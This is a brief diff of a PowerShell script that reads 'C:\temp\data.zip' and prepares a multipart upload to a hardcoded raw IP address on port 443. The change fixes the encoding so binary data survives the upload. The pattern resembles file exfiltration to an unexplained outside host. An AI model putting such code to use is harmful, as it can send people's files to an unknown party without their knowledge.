@@ -2,7 +2,7 @@ $FilePath = 'C:\temp\data.zip';
 $URL = 'http://43.207.188.219:443/u';
 
 $fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
-$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
+$fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes);
 $boundary = [System.Guid]::NewGuid().ToString(); 
 $LF = "`r`n";
 
